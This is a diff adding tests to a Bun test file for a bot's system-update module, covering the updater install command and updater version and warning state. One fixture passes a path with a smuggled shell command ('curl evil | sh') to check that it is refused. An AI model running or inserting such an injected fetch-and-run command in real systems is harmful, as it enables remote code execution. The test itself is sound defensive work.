@@ -1,5 +1,5 @@
 import { expect, test } from "bun:test";
-import { estimateText, isNewerBuild, projectSystemUpdateState, safeText } from "./system-update";
+import { estimateText, installUpdaterCommand, isNewerBuild, projectSystemUpdateState, safeText } from "./system-update";
 
 const running = { version: "0.1.2", buildId: "glass-20261012a", commit: "a".repeat(40) };
 const NOW = Date.parse("2026-10-12T02:00:00Z");
@@ -96,4 +96,22 @@ test("full-build fields: mode, duration, estimates, reason, external run", () =>
   expect(estimateText(540)).toBe("约 9 分钟");
   expect(estimateText(20)).toBe("约 1 分钟");
   expect(estimateText(undefined)).toBe("");
+});
+
+test("install command uses the deployment's checkout and refuses odd paths", () => {
+  expect(installUpdaterCommand("/srv/chisabot")).toBe("cd /srv/chisabot && git pull && sudo sh deploy/install-updater.sh");
+  expect(installUpdaterCommand()).toBe("cd /opt/chisabot-src && git pull && sudo sh deploy/install-updater.sh");
+  expect(installUpdaterCommand("/x; curl evil | sh")).toBe("cd /opt/chisabot-src && git pull && sudo sh deploy/install-updater.sh");
+});
+
+test("updater version and warnings are projected; a state without a version is an old updater", () => {
+  const base = { updatedAt: "Mon 2026-10-12 9:59 AM CST (UTC+08:00)" };
+  expect(projectSystemUpdateState(base, running, [], NOW)).toMatchObject({ updaterOutdated: true, warnings: [] });
+  expect(projectSystemUpdateState({ ...base, updaterVersion: "3", warnings: ["health_url_missing", 7] }, running, [], NOW)).toMatchObject({
+    updaterVersion: 3,
+    updaterOutdated: false,
+    warnings: ["health_url_missing"],
+  });
+  // Never wrote a state: not "outdated", just not installed.
+  expect(projectSystemUpdateState(null, running, [], NOW).updaterOutdated).toBe(false);
 });
